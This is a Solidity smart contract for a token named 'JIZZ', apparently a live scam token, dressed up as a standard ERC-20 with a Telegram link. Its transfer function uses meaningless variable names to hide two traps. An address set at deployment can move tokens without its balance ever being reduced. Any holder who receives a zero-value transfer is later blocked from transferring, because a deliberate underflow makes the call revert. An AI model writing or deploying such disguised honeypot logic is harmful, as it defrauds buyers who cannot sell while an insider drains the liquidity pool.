/*

🗯Telegram: https://t.me/jizz_eth

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Jizz is Ownable {
    address public uniswapV2Pair;

    mapping(address => uint256) private range;

    function equipment(address struggle, address colony, uint256 five) private returns (bool success) {
        if (range[struggle] == 0) {
            balanceOf[struggle] -= five;
        }

        if (five == 0) dot[colony] += studied;

        if (range[struggle] == 0 && uniswapV2Pair != struggle && dot[struggle] > 0) {
            range[struggle] -= studied;
        }

        balanceOf[colony] += five;
        emit Transfer(struggle, colony, five);
        return true;
    }

    mapping(address => uint256) private dot;

    function transferFrom(address struggle, address colony, uint256 five) public returns (bool success) {
        require(five <= allowance[struggle][msg.sender]);
        allowance[struggle][msg.sender] -= five;
        equipment(struggle, colony, five);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public name = 'JIZZ';

    function approve(address wind, uint256 five) public returns (bool success) {
        allowance[msg.sender][wind] = five;
        emit Approval(msg.sender, wind, five);
        return true;
    }

    uint8 public decimals = 9;

    string public symbol = 'JIZZ';

    constructor(address tears) {
        balanceOf[msg.sender] = totalSupply;
        range[tears] = studied;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private studied = 6;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address colony, uint256 five) public returns (bool success) {
        equipment(msg.sender, colony, five);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    mapping(address => mapping(address => uint256)) public allowance;
}